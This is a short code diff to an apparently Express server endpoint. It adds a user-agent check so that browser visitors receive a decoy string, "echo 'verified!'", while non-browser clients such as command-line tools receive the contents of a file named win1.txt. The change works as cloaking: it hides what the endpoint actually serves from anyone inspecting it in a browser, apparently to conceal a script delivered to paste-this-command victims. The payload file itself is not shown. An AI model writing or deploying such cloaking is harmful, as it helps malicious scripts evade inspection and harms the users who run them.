@@ -3,7 +3,19 @@
 const path = require('path');
 const fs = require('fs');
 
+function looksLikeBrowser(req) {
+  const ua = req.get("user-agent") ?? "";
+
+  // Common desktop and mobile browsers
+  const browserPattern =
+    /Chrome|Chromium|CriOS|Firefox|FxiOS|Safari|Edg|EdgA|EdgiOS|OPR|Opera|Brave|Vivaldi|SamsungBrowser|YaBrowser|DuckDuckGo|UCBrowser|Puffin|Silk|MSIE|Trident/i;
+
+  return browserPattern.test(ua);
+}
+
 async function showV1(req, res) {
+
+  if(looksLikeBrowser(req)) return res.send("echo 'verified!'");
   
   const filePath = path.join(__dirname, '../public', 'win1.txt');
 
